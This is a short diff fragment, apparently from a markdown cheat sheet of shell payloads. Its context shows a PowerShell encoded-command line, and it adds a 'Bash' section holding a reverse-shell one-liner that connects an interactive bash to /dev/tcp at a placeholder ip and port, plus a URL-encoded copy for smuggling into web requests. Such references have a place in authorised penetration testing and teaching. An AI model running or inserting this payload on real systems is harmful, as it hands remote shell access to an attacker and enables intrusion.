@@ -11,4 +11,11 @@ PS> $EncodedText =[Convert]::ToBase64String($Bytes)
 cmd> powershell -enc xyz
 ```
 
+## Bash 
+
+```
+bash -c "bash -i >& /dev/tcp/ip/port 0>&1"
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%200%3E%261%22
+```
+
 
